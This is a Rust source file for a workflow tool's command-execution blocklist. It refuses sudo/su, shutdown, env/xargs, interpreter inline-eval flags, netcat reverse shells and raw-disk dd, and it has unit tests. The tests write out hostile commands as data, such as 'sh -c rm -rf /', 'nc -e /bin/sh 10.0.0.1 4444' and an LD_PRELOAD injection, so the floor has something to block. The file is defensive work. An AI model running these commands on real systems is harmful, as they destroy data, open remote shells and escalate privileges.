// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! The argv exec floor — the ONE structural predicate both the runtime
//! (`nika-exec-runner::blocklist::check_argv`, the pre-spawn refusal) and
//! the static check (`nika-check`'s `exec_floor` lane, the `NIKA-SEC-001`
//! finding) judge with, so check ≡ run on the same argv (#605).
//!
//! The predicate lived runtime-only in `nika-exec-runner` (an L1 tokio
//! effect crate the L0 checker cannot depend on), so `nika check` grew a
//! hand-mirrored copy of the eval table behind a textual keep-in-sync
//! ratchet — and drifted green on argv the run then refused. The table
//! now lives HERE, an L0 leaf both sides already depend on (the
//! [`crate::net::host_in_allowlist`] precedent: one matcher for check ≡
//! run ≡ jail, no drift possible).
//!
//! SCOPE — what this module judges and what it never claims:
//!
//! - **argv form only** — the shell form rides the joined-string
//!   blocklist scan (`nika-exec-runner::blocklist::check_command`), which
//!   judges the interpolated string at run time; no static claim exists
//!   there. The argv form is judged STRUCTURALLY (positionally, per
//!   discrete element), so a literal argument that merely CONTAINS
//!   flag-shaped text is not a false positive.
//! - **the argv as given** — the caller judges a literal argv. An
//!   interpolated (`${{ }}`) element is the caller's signal to make no
//!   static claim: the runtime re-judges the resolved argv pre-spawn.
//!
//! CRAFT-preserved from the battle-tested `nika-exec-runner` blocklist —
//! **do not weaken**: every table line closes a documented attack.

use alloc::format;
use alloc::string::String;
use alloc::vec::Vec;

use unicode_normalization::UnicodeNormalization;

/// Zero-width / invisible characters stripped before the floor check
/// (NFKC preserves these — they are a confusable-bypass vector on their
/// own).
const ZERO_WIDTH_CHARS: &[char] = &[
    '\u{200B}', // Zero Width Space
    '\u{200C}', // Zero Width Non-Joiner
    '\u{200D}', // Zero Width Joiner
    '\u{FEFF}', // Zero Width No-Break Space (BOM)
    '\u{00AD}', // Soft Hyphen
    '\u{2060}', // Word Joiner
    '\u{180E}', // Mongolian Vowel Separator
];

/// The blocklist normalization law — NFKC + zero-width strip + whitespace
/// collapse. Shared by the shell-mode scan (`nika-exec-runner`, the
/// joined-string blocklist) and the argv floor below (the program-name
/// fold), so both sides normalize identically by construction.
#[must_use]
pub fn normalize_for_blocklist(s: &str) -> String {
    s.nfkc()
        .filter(|c| !ZERO_WIDTH_CHARS.contains(c))
        .collect::<String>()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

/// Programs blocked at the ARGV floor by their BASENAME alone — their mere
/// invocation is dangerous regardless of arguments. `command[0]` can be an
/// interpolated, attacker-influenced value, so [`program_basename`] NFKC-
/// normalizes confusables (fullwidth `ｓｕｄｏ` → `sudo`) before the EXACT
/// basename match (no substring false-positives · `issue` ≠ `su`). The argv
/// re-exec class (interpreter `-c`/`-e`, `nc -e`, `dd if=`) is handled
/// structurally by [`argv_floor_refusal`] — symmetric with shell mode.
const DANGEROUS_PROGRAMS: &[&str] = &[
    // Privilege escalation
    "sudo", "doas", "pkexec", "su", "runas",
    // System control (halts / reboots / powers off the host)
    "shutdown", "reboot", "halt", "poweroff",
    // Re-exec / env re-injection (review P0): `env VAR=x cmd` re-adds a
    // stripped var into the child (defeats the env scrub); `xargs` runs a
    // command built from its input. Workflows use the `env:` field, not `env`.
    "env", "xargs",
];

/// One interpreter family's inline-eval signature (P0-13 · audit UX
/// 2026-07-30). The flag that re-parses an argument AS code is a property of
/// the INTERPRETER (and its subcommand), not a global set — `python -c` and
/// `node -p` eval, but `node -c` is a syntax check, `php -r` evals, and
/// `unittest -p <pattern>` is the module's own flag, not a print-eval. A
/// global set both over-blocked (the `python3 -m unittest … -p` false
/// positive) and under-blocked (`deno eval <code>` — a SUBCOMMAND the flag
/// scan never saw).
#[derive(Clone, Copy)]
struct EvalSpec {
    /// Short-option LETTERS: any single-dash bundle containing one re-parses
    /// code (`perl -pe` · `node -pe` · `sh -ce`).
    short_letters: &'static [char],
    /// Long eval flags, EXACT — only where the interpreter really has them.
    long_flags: &'static [&'static str],
    /// Eval SUBCOMMANDS (`deno eval <code>`) — code execution with no flag.
    eval_subcommands: &'static [&'static str],
    /// Flags that CONSUME the next argv element as their operand — skipped,
    /// so the scan resumes after them (`python3 -X faulthandler -c …`).
    value_flags: &'static [&'static str],
    /// The module handoff (python `-m`): everything after `-m <module>` is
    /// the MODULE's argv — the interpreter's scan stops there.
    module_flag: Option<&'static str>,
}

/// The per-interpreter eval table — `None` for a program with no inline-eval
/// form. Running any of these on a SCRIPT FILE (`["python","app.py"]`) stays
/// allowed; only an eval flag/subcommand in the INTERPRETER's own argv
/// (before the script positional, `--`, or `-m <module>`) is refused at the
/// floor (route a genuine need via `pre_validated`).
fn eval_spec(base: &str) -> Option<EvalSpec> {
    const SHELLS: EvalSpec = EvalSpec {
        short_letters: &['c'],
        long_flags: &[],
        eval_subcommands: &[],
        value_flags: &[],
        module_flag: None,
    };
    const PYTHON: EvalSpec = EvalSpec {
        short_letters: &['c'],
        long_flags: &[],
        eval_subcommands: &[],
        value_flags: &["-W", "-X"],
        module_flag: Some("-m"),
    };
    const PERL_RUBY: EvalSpec = EvalSpec {
        short_letters: &['e', 'E'],
        long_flags: &[],
        eval_subcommands: &[],
        value_flags: &["-I", "-M", "-m", "-r"],
        module_flag: None,
    };
    const NODE: EvalSpec = EvalSpec {
        short_letters: &['e', 'p'],
        long_flags: &["--eval", "--print"],
        eval_subcommands: &[],
        value_flags: &["-r", "--require", "--import", "--loader"],
        module_flag: None,
    };
    const DENO_BUN: EvalSpec = EvalSpec {
        short_letters: &['e', 'p'],
        long_flags: &["--eval", "--print"],
        eval_subcommands: &["eval"],
        value_flags: &["-r", "--require", "--import", "--loader"],
        module_flag: None,
    };
    const PHP: EvalSpec = EvalSpec {
        short_letters: &['r'],
        long_flags: &[],
        eval_subcommands: &[],
        value_flags: &["-d", "-c"],
        module_flag: None,
    };
    match base {
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" => Some(SHELLS),
        "python" | "python2" | "python3" => Some(PYTHON),
        "perl" | "ruby" => Some(PERL_RUBY),
        "node" => Some(NODE),
        "deno" | "bun" => Some(DENO_BUN),
        "php" => Some(PHP),
        _ => None,
    }
}

/// Whether an interpreter's argv requests INLINE code evaluation (vs running
/// a script file) — POSITIONAL over the discrete argv elements, per the
/// interpreter's [`EvalSpec`] (P0-13): an eval flag (`python -c` · `node -p`
/// · `perl -pe` · `php -r`) or an eval SUBCOMMAND (`deno eval`) before the
/// handoff point refuses; the scan stops at the first positional (the script
/// file — the flags after it are the SCRIPT's argv), at `--`, and at the
/// module handoff (`python -m <module>` — the flags after it are the
/// MODULE's, so `python3 -m unittest discover -p test_*.py` stays allowed).
fn interpreter_eval_requested(base: &str, args: &[&str]) -> bool {
    matches!(
        interpreter_target(base, args),
        Some(InterpreterTarget::Eval)
    )
}

/// What an argv-form interpreter invocation asks the interpreter to DO —
/// the structural fact the eval walk below has always computed on its way
/// to a verdict, published instead of flattened.
///
/// The walk that proves "this is not inline eval" has, at that exact
/// moment, its hand on the script the interpreter will OPEN. Returning a
/// `bool` threw that away, and the fs boundary never learned of the file:
/// a `["bash","leg.sh"]` under an empty `permits.fs.read` audited green and
/// died 126 at the sandbox, reported as a success (measured 2026-08-20).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[non_exhaustive]
pub enum InterpreterTarget<'a> {
    /// An eval flag or subcommand — the code IS the argv. The floor refuses
    /// it ([`ArgvFloorRefusal::InterpreterEval`]); no file is opened.
    Eval,
    /// A script FILE. The interpreter must read it before it runs a line,
    /// so the sandbox's `fs.read` set has to admit it.
    Script(&'a str),
}

/// Walk one interpreter's OWN argv (everything before the script
/// positional, `--`, or `-m <module>`) and name what it targets.
///
/// `None` is the honest silence — not an interpreter, or the target is not
/// a path the interpreter opens BY NAME (`-` reads stdin · `-m` resolves a
/// module · `--` hands off without the walk having proven which element is
/// the script · an argv that ends on flags). A caller may claim nothing
/// there, which is what keeps the fs arm from reddening a correct file.
fn interpreter_target<'a>(base: &str, args: &[&'a str]) -> Option<InterpreterTarget<'a>> {
    let spec = eval_spec(base)?;
    let mut i = 0;
    while i < args.len() {
        let arg = args[i];
        if arg == "--" || Some(arg) == spec.module_flag {
            return None; // `--` / `-m <module>`: the rest is not the interpreter's
        }
        if spec.value_flags.contains(&arg) {
            i += 2; // the flag's operand is a value, not an option
            continue;
        }
        if arg.starts_with("--") {
            if spec.long_flags.contains(&arg) {
                return Some(InterpreterTarget::Eval);
            }
        } else if let Some(bundle) = arg.strip_prefix('-') {
            if bundle.is_empty() {
                return None; // `-` (stdin handoff): the rest is the script's
            }
            if bundle.chars().any(|c| spec.short_letters.contains(&c)) {
                return Some(InterpreterTarget::Eval);
            }
        } else if spec.eval_subcommands.contains(&arg) {
            // First positional · an eval subcommand (`deno eval <code>`).
            return Some(InterpreterTarget::Eval);
        } else {
            // First positional · the script file. Everything after it
            // belongs to the script, so the interpreter's walk ends here.
            return Some(InterpreterTarget::Script(arg));
        }
        i += 1;
    }
    None
}

/// The script FILE an argv-form interpreter invocation must OPEN and READ
/// before it can run a line.
///
/// The fs half of the exec floor's `check ≡ run` pair, and the twin of
/// [`argv_floor_refusal`]: that one names an argv the run refuses at the
/// BLOCKLIST, this one names the read the run needs from the SANDBOX. Both
/// walk the same interpreter table, so neither can drift from the other.
///
/// `None` is a claim of nothing — the program is not an interpreter, the
/// argv evals instead of opening a file, or the script is not named as a
/// path (`-` · `-m` · `--` · flags only). Callers MUST treat `None` as
/// silence, never as "no read needed".
#[must_use]
pub fn interpreter_script_operand<'a>(program: &str, args: &[&'a str]) -> Option<&'a str> {
    match interpreter_target(&program_basename(program), args) {
        Some(InterpreterTarget::Script(path)) => Some(path),
        Some(InterpreterTarget::Eval) | None => None,
    }
}

/// The normalized lowercase BASENAME of an argv program — NFKC + zero-width
/// folding (because `command[0]` may be an interpolated, attacker-influenced
/// value), then the path tail. Quoting is NOT stripped — `execve` takes the
/// program literally, so `su""do` is a (non-existent) filename, not `sudo`.
fn program_basename(program: &str) -> String {
    let normalized = normalize_for_blocklist(program);
    normalized
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(normalized.as_str())
        .to_lowercase()
}

/// Why the argv floor refuses a command (#605). The runtime maps the variant
/// to its `ShellError::Blocked` through [`ArgvFloorRefusal::reason`] (the
/// exact historical sentence); the static check reads the variant to teach
/// the repair in its own voice. One predicate, two surfaces.
#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub enum ArgvFloorRefusal {
    /// The program's basename alone is dangerous (privilege escalation ·
    /// system control · env re-injection) — refused regardless of args.
    DangerousProgram {
        /// The normalized lowercase basename that matched the floor.
        base: String,
    },
    /// An interpreter was asked to re-parse an argument AS code (an eval
    /// flag or subcommand) instead of running a script file.
    InterpreterEval {
        /// The normalized lowercase basename of the interpreter.
        base: String,
    },
    /// `nc`/`ncat` with `-e`/`-c` — a reverse shell.
    NetcatExec,
    /// `dd` with `if=`/`of=` — raw disk read/write.
    DdRawDisk,
}

impl ArgvFloorRefusal {
    /// The refusal sentence the runtime's `ShellError::Blocked` carries —
    /// the ONE voice, so a run trace and a check finding quote the same
    /// law verbatim. Byte-pinned by this module's tests.
    #[must_use]
    pub fn reason(&self) -> String {
        match self {
            Self::DangerousProgram { base } => format!(
                "program {base:?} is blocked at the exec floor \
                 (privilege escalation / system control / re-exec)"
            ),
            Self::InterpreterEval { base } => format!(
                "argv interpreter inline-eval refused: {base:?} with an eval flag \
                 or subcommand runs attacker-influenceable code — run a script \
                 file or route via pre_validated"
            ),
            Self::NetcatExec => {
                String::from("argv `nc -e/-c` (reverse shell) refused at the exec floor")
            }
            Self::DdRawDisk => {
                String::from("argv `dd if=/of=` (raw disk read/write) refused at the exec floor")
            }
        }
    }
}

/// Check an argv-form PROGRAM's IDENTITY against `DANGEROUS_PROGRAMS` (an
/// exact basename match · no substring false-positives).
#[must_use]
pub fn argv_program_refusal(program: &str) -> Option<ArgvFloorRefusal> {
    let base = program_basename(program);
    if DANGEROUS_PROGRAMS.contains(&base.as_str()) {
        return Some(ArgvFloorRefusal::DangerousProgram { base });
    }
    None
}

/// Judge a full argv-form command against the exec floor: the program
/// IDENTITY ([`argv_program_refusal`]) PLUS the structural re-exec class
/// that shell mode blocks but a name-only check misses — an interpreter
/// invoked with an inline-eval flag or subcommand (`["sh","-c",…]` ·
/// `["python","-c",…]` · `["perl","-e",…]` · `["deno","eval",…]`, per the
/// interpreter's own `eval_spec` · P0-13), `nc -e`/`-c` (reverse shell),
/// `dd if=`/`of=` (raw disk). Checked STRUCTURALLY (positionally, per
/// discrete argv element), so a LITERAL argument that merely CONTAINS such
/// text is NOT a false positive — the difference from a joined-string
/// scan. `None` = the floor admits the argv.
#[must_use]
pub fn argv_floor_refusal<S: AsRef<str>>(program: &str, args: &[S]) -> Option<ArgvFloorRefusal> {
    if let Some(refusal) = argv_program_refusal(program) {
        return Some(refusal);
    }
    let base = program_basename(program);
    let args: Vec<&str> = args.iter().map(AsRef::as_ref).collect();
    if interpreter_eval_requested(&base, &args) {
        return Some(ArgvFloorRefusal::InterpreterEval { base });
    }
    if matches!(base.as_str(), "nc" | "ncat")
        && args
            .iter()
            .any(|a| a.starts_with("-e") || a.starts_with("-c"))
    {
        return Some(ArgvFloorRefusal::NetcatExec);
    }
    if base == "dd"
        && args
            .iter()
            .any(|a| a.starts_with("if=") || a.starts_with("of="))
    {
        return Some(ArgvFloorRefusal::DdRawDisk);
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn refused(program: &str, args: &[&str]) -> bool {
        argv_floor_refusal(program, args).is_some()
    }

    fn allowed(program: &str, args: &[&str]) -> bool {
        argv_floor_refusal(program, args).is_none()
    }

    // ── the script operand · the fact the eval walk already computes ──

    /// The interpreter's script positional is the file the RUN must open.
    /// Today `interpreter_eval_requested` finds it and throws it away, so
    /// the fs boundary never learns of it and a sandboxed run dies 126 on
    /// a file `nika check` called green.
    #[test]
    fn the_interpreter_script_operand_is_the_file_the_run_must_open() {
        assert_eq!(
            interpreter_script_operand("bash", &["leg.sh"]),
            Some("leg.sh")
        );
        assert_eq!(
            interpreter_script_operand("/bin/sh", &["-e", "deploy.sh"]),
            Some("deploy.sh")
        );
        assert_eq!(
            interpreter_script_operand("python3", &["-X", "faulthandler", "app.py"]),
            Some("app.py")
        );
        assert_eq!(
            interpreter_script_operand("node", &["tools/build.js", "--watch"]),
            Some("tools/build.js")
        );
    }

    /// The silences, each for its own reason — a claim here would redden a
    /// file the run admits.
    #[test]
    fn the_script_operand_stays_silent_where_no_file_is_opened_by_name() {
        // inline eval · the code is the argv, there is no file
        assert_eq!(interpreter_script_operand("bash", &["-c", "echo hi"]), None);
        // not an interpreter · positional semantics are the program's own
        assert_eq!(interpreter_script_operand("echo", &["hi.txt"]), None);
        // `-m module` · the interpreter resolves a module, not a named path
        assert_eq!(
            interpreter_script_operand("python3", &["-m", "unittest"]),
            None
        );
        // `-` · the script arrives on stdin
        assert_eq!(interpreter_script_operand("sh", &["-", "arg"]), None);
        // `--` · conservative silence rather than a positional guess
        assert_eq!(interpreter_script_operand("bash", &["--", "leg.sh"]), None);
        // no positional at all
        assert_eq!(interpreter_script_operand("bash", &[]), None);
    }

    // ── the program-identity floor (exact basename · no substrings) ──

    #[test]
    fn floor_blocks_priv_esc_and_system_control() {
        for p in [
            "sudo",
            "/usr/bin/sudo",
            "doas",
            "pkexec",
            "su",
            "runas",
            "shutdown",
            "/sbin/reboot",
            "halt",
            "poweroff",
        ] {
            assert!(
                matches!(
                    argv_program_refusal(p),
                    Some(ArgvFloorRefusal::DangerousProgram { .. })
                ),
                "argv floor must block: {p}"
            );
        }
    }

    #[test]
    fn floor_is_exact_basename_not_substring() {
        // `su` is blocked, but programs that merely CONTAIN it are not —
        // exact basename match kills the substring false-positives.
        assert!(argv_program_refusal("su").is_some());
        for ok in ["issue", "sudoku", "subl", "lsusb"] {
            assert!(argv_program_refusal(ok).is_none(), "must allow: {ok}");
        }
    }

    #[test]
    fn floor_allows_normal_programs_and_shell_wrappers() {
        // The wrappers the SHELL-line scanner over-blocks (timeout / env /
        // nice) and ordinary tools pass the argv floor — checked by
        // identity, not by a fake-shell scan of their arguments. (`env` and
        // `xargs` ARE floor-blocked: they re-inject the scrubbed
        // environment / re-exec built commands.)
        for ok in [
            "echo", "cargo", "git", "npm", "ffmpeg", "timeout", "nice", "rm", "printenv",
        ] {
            assert!(argv_program_refusal(ok).is_none(), "must allow: {ok}");
        }
    }

    #[test]
    fn floor_normalizes_confusable_program() {
        // An interpolated `command[0]` of fullwidth `ｓｕｄｏ` folds to `sudo`.
        assert!(argv_program_refusal("\u{FF53}\u{FF55}\u{FF44}\u{FF4F}").is_some());
    }

    #[test]
    fn floor_does_not_dequote_the_program() {
        // execve takes the program literally; `su""do` is a filename that is
        // NOT `sudo` (no shell to strip the quotes), so the floor allows it
        // (it would simply fail to spawn as NotFound).
        assert!(argv_program_refusal("su\"\"do").is_none());
    }

    // ── the re-exec class (the runtime's review-P0 floor) ─────────────

    #[test]
    fn floor_blocks_interpreter_inline_code() {
        // The re-exec class shell mode forbids must NOT be reachable via argv.
        assert!(refused("sh", &["-c", "rm -rf /"]));
        assert!(refused("bash", &["-c", "evil"]));
        assert!(refused("/usr/bin/python3", &["-c", "import os"]));
        assert!(refused("perl", &["-e", "system('id')"]));
        assert!(refused("node", &["-e", "process.exit()"]));
        assert!(refused("ruby", &["-e", "x"]));
        assert!(refused("node", &["--eval", "x"])); // long form
        assert!(refused("python", &["-c"])); // the eval flag is the signal
        assert!(refused("sh", &["-ce", "x"])); // a bundle containing `c` evals
        // …but `sh -e` is ERREXIT, not inline eval (the eval letter for
        // the shell family is `c` only — P0-13's per-interpreter table):
        // the floor allows it, and the static check must agree (#605).
        assert!(allowed("sh", &["-e", "deploy.sh"]));
    }

    #[test]
    fn floor_allows_interpreters_on_script_files() {
        // The legit case — an interpreter on a SCRIPT FILE (no eval flag).
        assert!(allowed("python3", &["app.py", "--port", "8080"]));
        assert!(allowed("node", &["server.js"]));
        assert!(allowed("bash", &["deploy.sh", "prod"]));
        assert!(allowed("ruby", &["rake", "test"]));
        assert!(allowed("python", &["-m", "pytest"])); // -m is module, not eval
    }

    // ── P0-13: eval flags are PER-INTERPRETER ─────────────────────────

    #[test]
    fn python_m_makes_later_flags_the_modules() {
        // After `-m <module>` the rest of argv is the MODULE's —
        // `unittest -p <pattern>` is a pattern flag, not a print-eval.
        assert!(allowed(
            "python3",
            &["-m", "unittest", "discover", "tests", "-p", "test_*.py"]
        ));
        assert!(allowed("python3", &["-m", "pip", "--version"]));
        // …but python's OWN eval flag still refuses, wherever it sits.
        assert!(refused("python3", &["-c", "import os"]));
        assert!(refused("python", &["-v", "-c", "x"]));
    }

    #[test]
    fn node_p_and_print_block_but_c_is_a_syntax_check() {
        assert!(refused("node", &["-p", "1+1"]));
        assert!(refused("node", &["--print", "1+1"]));
        assert!(refused("node", &["-e", "x"]));
        assert!(refused("node", &["--eval", "x"]));
        assert!(refused("node", &["-pe", "x"])); // bundled eval-print
        assert!(allowed("node", &["-c", "server.js"]));
        assert!(allowed("node", &["--check", "server.js"]));
    }

    #[test]
    fn deno_bun_eval_subcommand_blocks() {
        // `deno eval <code>` re-parses an argument AS code via a SUBCOMMAND
        // the global-flag scan never looked at.
        assert!(refused("deno", &["eval", "Deno.exit(1)"]));
        assert!(refused("bun", &["eval", "process.exit(1)"]));
        assert!(allowed("deno", &["run", "server.ts"]));
        assert!(refused("bun", &["-e", "x"]));
    }

    #[test]
    fn php_perl_ruby_keep_their_own_eval_flags() {
        assert!(refused("php", &["-r", "system('id');"]));
        assert!(refused("perl", &["-e", "x"]));
        assert!(refused("perl", &["-pe", "s/a/b/"])); // bundled eval
        assert!(refused("ruby", &["-e", "x"]));
        assert!(refused("ruby", &["-E", "x"]));
        // No cross-family bleed: `-c` is not eval for php/perl/ruby (ruby's
        // `-c` is a syntax check, php's `-l` a lint).
        assert!(allowed("ruby", &["-c", "app.rb"]));
        assert!(allowed("php", &["-l", "index.php"]));
    }

    #[test]
    fn eval_flags_stop_at_the_script_positional() {
        // Positional argv parsing: the flags AFTER the script file belong
        // to the SCRIPT, not to the interpreter.
        assert!(allowed("python3", &["app.py", "-p", "8080"]));
        assert!(allowed("node", &["server.js", "-p", "8080"]));
        // Value-taking interpreter flags consume their operand — scanning
        // resumes after them, so the eval flag is still caught.
        assert!(refused("python3", &["-X", "faulthandler", "-c", "x"]));
        assert!(refused("node", &["--require", "ts-node", "-e", "x"]));
    }

    #[test]
    fn floor_blocks_env_reinjection_and_reverse_shells() {
        // `env` re-adds a stripped var into the child → defeats the env scrub.
        assert!(refused("env", &["LD_PRELOAD=/tmp/x.so", "cat", "/secret"]));
        assert!(refused("/usr/bin/env", &["sh", "-c", "evil"]));
        assert!(refused("xargs", &["rm"]));
        assert!(matches!(
            argv_floor_refusal("nc", &["-e", "/bin/sh", "10.0.0.1", "4444"]),
            Some(ArgvFloorRefusal::NetcatExec)
        ));
        assert!(matches!(
            argv_floor_refusal("ncat", &["-c", "sh"]),
            Some(ArgvFloorRefusal::NetcatExec)
        ));
        assert!(matches!(
            argv_floor_refusal("dd", &["if=/dev/sda", "of=/dev/null"]),
            Some(ArgvFloorRefusal::DdRawDisk)
        ));
    }

    #[test]
    fn floor_allows_ordinary_argv_with_metachar_args() {
        // A LITERAL arg carrying shell metacharacters (or interpreter-flag
        // TEXT) is NOT a false positive — the floor is structural.
        assert!(allowed("echo", &["a; b | c"]));
        assert!(allowed("printf", &["%s", "; rm -rf /"]));
        assert!(allowed("echo", &["run python -c please"])); // literal text
        assert!(allowed("git", &["commit", "-m", "node -e fix"]));
        assert!(allowed("nc", &["-l", "8080"])); // listener (no -e/-c)
        assert!(allowed("dd", &["--version"])); // no if=/of=
    }

    // ── the one voice: reason() IS the runtime's refusal sentence ─────

    #[test]
    fn reason_strings_are_byte_pinned_to_the_runtime_voice() {
        let eval = ArgvFloorRefusal::InterpreterEval {
            base: String::from("bash"),
        };
        assert_eq!(
            eval.reason(),
            "argv interpreter inline-eval refused: \"bash\" with an eval flag \
             or subcommand runs attacker-influenceable code — run a script \
             file or route via pre_validated"
        );
        let prog = ArgvFloorRefusal::DangerousProgram {
            base: String::from("sudo"),
        };
        assert_eq!(
            prog.reason(),
            "program \"sudo\" is blocked at the exec floor \
             (privilege escalation / system control / re-exec)"
        );
        assert_eq!(
            ArgvFloorRefusal::NetcatExec.reason(),
            "argv `nc -e/-c` (reverse shell) refused at the exec floor"
        );
        assert_eq!(
            ArgvFloorRefusal::DdRawDisk.reason(),
            "argv `dd if=/of=` (raw disk read/write) refused at the exec floor"
        );
    }
}
